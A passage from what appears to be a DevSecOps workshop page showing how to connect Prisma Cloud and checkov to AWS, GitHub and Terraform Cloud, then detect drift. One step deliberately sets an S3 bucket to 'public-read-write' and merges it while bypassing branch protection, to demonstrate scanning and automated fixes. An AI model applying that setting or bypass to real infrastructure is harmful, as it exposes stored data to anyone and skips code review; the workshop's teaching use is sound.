<img alt="6" src="/aws-ws/images/6/61/ex/8.png?featherlight=false&width=90pc"></p>
<ul>
<li>Go to the <strong>S3</strong> menu within AWS to view the bucket that has been deployed.</li>
<li>Now let&rsquo;s see how we can leverage Prisma Cloud to make this all easier, gain more featues and scale security at ease.</li>
</ul>
<p><img alt="6" src="/aws-ws/images/6/61/ex/7.png?featherlight=false&width=90pc"></p>
<p>Terraform destroy</p>
<ul>
<li>Settings - Destruction and Deletion
<ul>
<li>Destroy infrastructure -&gt; Queue destroy plan</li>
</ul>
</li>
</ul>
<p><img alt="6" src="/aws-ws/images/6/61/ex/9.png?featherlight=false&width=90pc">
<img alt="6" src="/aws-ws/images/6/61/ex/10.png?featherlight=false&width=90pc">
<img alt="6" src="/aws-ws/images/6/61/ex/11.png?featherlight=false&width=90pc">
<img alt="6" src="/aws-ws/images/6/61/ex/13.png?featherlight=false&width=90pc">
<img alt="6" src="/aws-ws/images/6/61/ex/14.png?featherlight=false&width=90pc"></p>
<p>Amazone S3 overview</p>
<p><img alt="6" src="/aws-ws/images/6/61/ex/12.png?featherlight=false&width=90pc"></p>
<h3 id="welcome-to-prisma-cloud">Welcome to Prisma Cloud</h3>
<p>Prisma Cloud is a Cloud Native Application Protection Platform (CNAPP) comprised of three main pillars:</p>
<ul>
<li>Cloud Security</li>
<li>Runtime Security</li>
<li>Application Security</li>
</ul>
<p>Across these three &ldquo;modules&rdquo;, Prisma Cloud provides comprehensive security capabilities spanning code to cloud. This workshop will mainly focus on the Application Security module within the Prisma Cloud platform.</p>
<h4 id="section-2-application-security-with-prisma-cloud">Section 2: Application Security with Prisma Cloud</h4>
<ol>
<li>Onboard AWS Account</li>
</ol>
<p>We need to configure Prisma Cloud to communitcate with a CSP. Let&rsquo;s do this by onboarding an AWS Account.</p>
<p>Navigate to Settings &gt; Providers &gt; Connect Provider and follow the instructions prompted by the conifguration wizard.</p>
<ul>
<li>Select <strong>Amazon Web Services</strong>.</li>
<li>Choose <strong>Account for the scope</strong>, deselect <strong>Agentless Workload Scanning</strong>, leave the rest as default and click <strong>Done</strong>.</li>
<li>Provide your <strong>Account ID</strong> and enter an <strong>Account Name</strong>. Then click <strong>Create IAM Role</strong> to have Prisma Cloud auto-configure itself.</li>
<li>Scroll to the bottom of the AWS page that opens, click to <strong>acknowledge</strong> the disclaimer and then click <strong>Create stack</strong>.</li>
<li>Wait a moment while the stack is created, we need an output from the final result of the stack being deployed.</li>
<li>Once created, go to the <strong>Outputs</strong> tab and copy the value of ARN displayed.</li>
<li>Head back to <strong>Prisma Cloud</strong> and paste this value into the <strong>IAM Role ARN</strong> field, then click <strong>Next</strong>.</li>
<li>Wait for the connectivity test to run, review the status and click <strong>Save and Close</strong>.</li>
<li>View the onboarded cloud account under <strong>Settings &gt; Providers</strong>.</li>
</ul>
<p>2.Integrations and Providers</p>
<ul>
<li>Let&rsquo;s start by integrating with checkov.</li>
</ul>
<ol start="3">
<li>Checkov with API Key</li>
</ol>
<ul>
<li>To generate an API key, navigate to <strong>Settings &gt; Access Control</strong>. Click the Add button and select <code>Access Key</code>.</li>
<li>Download the <code>csv</code> file containing the credentials then click <code>Done</code>.</li>
<li>In a terminal window run checkov against the entire <code>code</code> directory, now with an API key. Use the following command:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>checkov -d . --bc-api-key &lt;access_key_id::&lt;secret_key&gt; --repo-id prisma/devsecops-workshop --prisma-api-url https://api4.prismacloud.io
</span></span></code></pre></div><p>Notice how the results now contain a severity. There are some other features that come with Prisma Cloud (using an API key) as well&hellip;</p>
<p>Return back to Prisma Cloud to view the results that checkov surfaced in the platform. Navigate to <strong>Application Security &gt; Projects</strong>.</p>
<p>Let&rsquo;s add this same API key to the GitHub Action created earlier. Within your GitHub repository, go to <strong>Settings &gt; Secrets</strong> and variables then select <strong>Actions</strong>.</p>
<ul>
<li>Click New <code>repository secret </code>then input the secret value of <code>&lt;access_key_id&gt;::&lt;secret_key&gt;</code> pair.</li>
<li>Edit <code>checkov.yaml</code>, remove comments for <code>api-key</code> and<code> PRISMA_API_URL</code>.</li>
<li>Commit directly to main branch.</li>
</ul>
<p>Now check the results under <code>Security &gt; Code scanning</code>. The same findings that displayed here earlier now with a <code>Severity</code> to sort and prioritze with.</p>
<p>Return again to Prisma Cloud to view the results that were sent to the the platform.</p>
<p><code>[!TIP] You can use Prisma Cloud (checkov w/ an API key) to scan docker images for vulnerabilities! Use the --docker-image flag and point to an image name or ID.</code></p>
<ol start="4">
<li>Terraform Cloud Run Tasks</li>
</ol>
<p>Let&rsquo;s now connect Prisma Cloud with Terraform Cloud using the Run Tasks integration.
This allows for developers and platform teams to get immediate security feedback for every pipeline run.
The Run Task integration will also surface results of every pipeline run to Prisma Cloud and the Security team.</p>
<ul>
<li>First we need to create an API key in Terraform Cloud. Go to the Terraform Cloud console and navigate to <strong>User Settings &gt; Tokens</strong> then click <strong>Create an API Token</strong>.</li>
<li>Copy the token and save the value somewhere safe. This will be provided to Prisma Cloud in the next step.</li>
<li>Go to the Prisma Cloud console and navigate to <strong>Settings &gt; Connect Provider &gt; Code &amp; Build Providers</strong> to set up the integration.</li>
<li>Under <strong>CI/CD Runs</strong>, choose <strong>Terraform Cloud (Run Tasks)</strong>.</li>
<li>Enter the API token generated in Terraform Cloud and click Next.</li>
<li>Select your Organization.</li>
<li>Select your <strong>Workspace</strong> and choose the <strong>Run Stage</strong> in which you want Prisma Cloud to execute a scan. Pre-plan will scan HCL code, Post-plan will scan the Terraform plan.out file. Once completed, click <strong>Done</strong>.</li>
<li>Return back to Terraform Cloud to view the integration. Go to your <strong>Workspace</strong> and click <strong>Settings &gt; Run Tasks</strong>.</li>
</ul>
<ol start="5">
<li>GitHub Application</li>
</ol>
<p>Next we will set up the Prisma Cloud GitHub Application which will perform easy-to-configure code scanning for GitHub repos.</p>
<ul>
<li>Go to Prisma Cloud and create a new integration under Settings &gt; Connect Provider &gt; Code &amp; Build Providers.</li>
<li>Under <strong>Code Repositories</strong>, select <strong>GitHub</strong>.</li>
<li>Follow the install wizard and <strong>Authorize</strong> your GitHub account.</li>
<li>Select the repositories you would like to provide access to and click <strong>Install &amp; Authorize</strong>.</li>
<li>Select the target repositories to scan now accessible from the Prisma Cloud wizard, then click <strong>Next</strong>.</li>
<li>Click <strong>Done</strong> once completed. Navigate to <strong>Settings &gt; Providers &gt; Repositories</strong> to view the onboarded repo(s).</li>
</ul>
<ol start="6">
<li>Submit a Pull Request 2.0</li>
</ol>
<p>Lets push a change to test the integration. Navigate to GitHub and make a change to the s3 resource deployed earlier under <code>code/build/s3.tf</code>.</p>
<p>Add the following line of code to the s3 resource definition. Then click Commit changes&hellip; once complete.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>acl <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;public-read-write&#34;</span>
</span></span></code></pre></div><ul>
<li>Create a new branch and click Propose changes.</li>
<li>On the next page, review the diff then click Create pull request. Once gain, click Create pull request to open the pull request.</li>
<li>Let the checks run against the pull request. Prisma Cloud can review pull requests and will add comments with proposed changes to give developers actionable feedback within their VCS platform.</li>
<li>When ready, click <strong>Merge pull request</strong> bypassing branch protection rules if still enabled.</li>
<li>Now that the change has been merged, navigate back to Terraform Cloud to view the pipeline running.</li>
<li>Check the Post-plan stage and view the results of the Prisma Cloud scan.</li>
<li>Leave this as is for now. We will soon fix the error and retrigger the pipeline.</li>
</ul>
<ol start="7">
<li>View scan results in Prisma Cloud</li>
</ol>
<p>Return to Prisma Cloud to view the results of all the scans that were just performed.</p>
<p>Navigate to <strong>Application Security &gt; Projects &gt; Overview</strong> to view findings for all scans. Filter the results with the Repository drop-down menu.</p>
<p>View relevant CI/CD Risks <strong>Application Security &gt; CI/CD Risks</strong>:</p>
<p>Get a full SBOM analysis under <strong>Application Security &gt; SBOM</strong>:</p>
<p>Take a look at <strong>Dashboards &gt; Code Security</strong> to get top-level reports.</p>
<p>Another useful view can be found under <strong>Inventory &gt; IaC Resources</strong></p>
<p><strong>Enforcement Rules</strong>
The level of enforcement applied to each code scan can be controlled under S<strong>ettings &gt; Configure &gt; Application Security &gt; Enforcement Rules</strong></p>
<p>These can be adjusted as a top-down policy or exceptions can be created for specific repositories / integrations.</p>
<ol start="8">
<li>Issue a PR-Fix</li>
</ol>
<p>Lets create a pull request from the Prisma Cloud console to apply a code fix. Navigate to <strong>Application Security &gt; Projects &gt; Overview IaC Misconfiguration</strong> then find the dev_s3 bucket with the public access violations.</p>
<p>Then click the <strong>Submit</strong> button in the top right to open a pull request.</p>
<p>Navigate back to GitHub and check the Pull request tab to see the fix Prisma Cloud submitted.</p>
<p>Drill into the pull request and inspect the file changes under the <strong>Files changes</strong> tab. Notice the changes made to remediate the original policy violation.</p>
<p>Go back to the <strong>Coversation</strong> tab and click <strong>Merge the pull request</strong> at the bottom to check this code into the main branch.</p>
<p>Check Terraform Cloud to view the plan succesfully run. No need to apply this run as we will use the earlier deployment for our next example.</p>
<ol start="9">
<li>Drift Detection</li>
</ol>
<p>In this final section, we will use the pipeline we built to detect drift. Drift occurs when infrastructure running in the cloud becomes configured differntly from what was originally defined in code.</p>
<p>This usually happens during a major incident, where DevOps and SRE teams make manual changes to quickly solve a problem, such as opening up ports to larger CIDR blocks or turning off HTTPS to find the problem. Sometimes lack of access and/or familiarity with IaC/CICD makes fixing an issue directly in the cloud easier than fixing in code and redeploying. If these arenât reverted, they present security issues and it weakens the benefits of using IaC.</p>
<p>We will use the S3 bucket deployed earlier to simulate drift in a resource configuration.</p>
<p><code>[!NOTE] By default Prisma Cloud performs full resource scans on an hourly interval.</code></p>
<p>Next, go to the AWS Console under S3 buckets and add a new tag to the bucket created earlier.</p>
<p>For example, add a tag with the key/value pair drift = true and click Save changes.</p>
<p>On the next scan Prisma Cloud will detect this change and notify users that a resource configuration has changed from how it is defined in code. To view this, navigate to <strong>Projects &gt; IaC Misconfiguration</strong> and filter for <strong>Drift</strong> under the <strong>IaC Categories</strong> dropdown menu.</p>
<p>Prisma Cloud provides the option to revert the change via the same pull request mechanism we just performed which would trigger a pipeline run and patch the resource.</p>
<h4 id="wrapping-up">Wrapping Up</h4>
<p>Congrats! In this workshop, we didnât just learn how to identify and automate fixing misconfigurations â we learned how to bridge the gaps between Development, DevOps, and Cloud Security. We are now equipped with full visibility, guardrails, and remediation capabilities across the development lifecycle. We also learned how important and easy it is to make security accessible to our engineering teams.</p>
<p>Try more of the integrations with other popular developer and DevOps tools. Share what youâve found with other members of your team and show how easy it is to incorporate this into their development processes.</p>





<footer class=" footline" >
	
</footer>

        
        </div> 
        

      </div>

    <div id="navigation">
        
        
        
        
            
            
                
                    
                    
                
                

                    
                    
                        
                    
                    

                    
                        
            
            
                
                    
                        
                        
                    
                
                

                    
                    
                    

                    
            
        
                    
                        
            
            
                
                    
                
                

                    
                    
                        
                    
                    

                    
                        
            
            
                
                    
                
                

                    
                    
                    

                    
            
        
                    
                        
            
            
                
                    
                
                

                    
                    
                    

                    
            
        
                    
                        
            
            
                
                    
                
                

                    
                    
                    

                    
            
        
                    
                        
            
            
                
                    
                
                

                    
                    
                    

                    
            
        
                    
                        
            
            
                
                    
                
                

                    
                    
                    

                    
            
        
                    
            
        
                    
                        
            
            
                
                    
                
                

                    
                    
                        
                    
                    

                    
                        
            
            
                
                    
                
                

                    
                    
                        
                    
                    

                    
                        
            
            
                
                    
                
                

                    
                    
                    

                    
            
        
                    
                        
            
            
                
                    
                
                

                    
                    
                    

                    
            
        
                    
            
        
                    
            
        
                    
                        
            
            
                
                    
                
                

                    
                    
                        
                    
                    

                    
                        
            
            
                
                    
                
                

                    
                    
                    

                    
            
        
                    
                        
            
            
                
                    
                
                

                    
                    
                    

                    
            
        
                    
            
        
                    
                        
            
            
                
                    
                
                

                    
                    
                        
                    
                    

                    
                        
            
            
                
                    
                
                

                    
                    
                        
                    
                    

                    
                        
            
            
                
                    
                
                

                    
                    
                    

                    
            
        
                    
                        
            
            
                
                    
                
                

                    
                    
                    

                    
            
        
                    
                        
            
            
                
                    
                
                

                    
                    
                    

                    
            
        
                    
                        
            
            
                
                    
                
                

                    
                    
                    

                    
            
        
                    
            
        
                    
                        
            
            
                
                    
                
                

                    
                    
                    

                    
            
        
                    
                        
            
            
                
                    
                
                

                    
                    
                    

                    
            
        
                    
                        
            
            
                
                    
                
                

                    
                    
                    

                    
            
        
                    
                        
            
            
                
                    
                
                

                    
                    
                    

                    
            
        
                    
                        
            
            
                
                    
                
                

                    
                    
                        
                    
                    

                    
                        
            
            
                
                    
                
                

                    
                    
                    

                    
            
        
                    
            
        
                    
                        
            
            
                
                    
                
                

                    
                    
                    

                    
            
        
                    
                        
            
            
                
                    
                
                

                    
                    
                        
                    
                    

                    
                        
            
            
                
                    
                
                

                    
                    
                    

                    
            
        
                    
            
        
                    
                        
            
            
                
                    
                
                

                    
                    
                    

                    
            
        
                    
                        
            
            
                
                    
                
                

                    
                    
                    

                    
            
        
                    
                        
            
            
                
                    
                
                

                    
                    
                    

                    
            
        
                    
                        
            
            
                
                    
                
                

                    
                    
                    

                    
            
        
                    
            
        
                    
                        
            
            
                
                    
                    
                
                

                    
                    
                        
                    
                    

                    
                        
            
            
                
                    
                    
                
                

                    
                    
                    

                    
            
        
                    
            
        
                    
                        
            
            
                
                    
                        
                        
                    
                
                

                    
                    
                        
                    
                    

                    
                        
            
            
                
                    
                
                

                    
                    
                    

                    
            
        
                    
                        
            
            
                
                    
                
                

                    
                    
                    

                    
            
        
                    
                        
            
            
                
                    
                
                

                    
                    
                    

                    
            
        
                    
                        
            
            
                
                    
                
                

                    
                    
                    

                    
            
        
                    
            
        
                    
                        
            
            
                
                    
                
                

                    
                    
                        
                    
                    

                    
                        
            
            
                
                    
                
                

                    
                    
                    

                    
            
        
                    
                        
            
            
                
                    
                
                

                    
                    
                    

                    
            
        
                    
                        
            
            
                
                    
                
                

                    
                    
                    

                    
            
        
                    
                        
            
            
                
                    
                
                

                    
                    
                    

                    
            
        
                    
            
        
                    
            
        
        
        


	 
	 
		
			<a class="nav nav-prev" href="/aws-ws/6-wsaudio/" title="AWS Workshop Studio"> <i class="fa fa-chevron-left"></i></a>
		
		
			<a class="nav nav-next" href="/aws-ws/7-fcj/" title="First Cloud Journey" style="margin-right: 0px;"><i class="fa fa-chevron-right"></i></a>
		
	
    </div>

    </section>
    
    <div style="left: -1000px; overflow: scroll; position: absolute; top: -1000px; border: none; box-sizing: content-box; height: 200px; margin: 0px; padding: 0px; width: 200px;">
      <div style="border: none; box-sizing: content-box; height: 200px; margin: 0px; padding: 0px; width: 200px;"></div>
    </div>
    <script src="/aws-ws/js/clipboard.min.js?1717056299"></script>
    <script src="/aws-ws/js/perfect-scrollbar.min.js?1717056299"></script>
    <script src="/aws-ws/js/perfect-scrollbar.jquery.min.js?1717056299"></script>
    <script src="/aws-ws/js/jquery.sticky.js?1717056299"></script>
    <script src="/aws-ws/js/featherlight.min.js?1717056299"></script>
    <script src="/aws-ws/js/highlight.pack.js?1717056299"></script>
    <script>hljs.initHighlightingOnLoad();</script>
    <script src="/aws-ws/js/modernizr.custom-3.6.0.js?1717056299"></script>
    <script src="/aws-ws/js/learn.js?1717056299"></script>
    <script src="/aws-ws/js/hugo-learn.js?1717056299"></script>

    <link href="/aws-ws/mermaid/mermaid.css?1717056299" rel="stylesheet" />
    <script src="/aws-ws/mermaid/mermaid.js?1717056299"></script>
    <script>
        mermaid.initialize({ startOnLoad: true });
    </script>
    <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-158079754-2', 'auto');
  ga('send', 'pageview');

</script>
  </body>
</html>
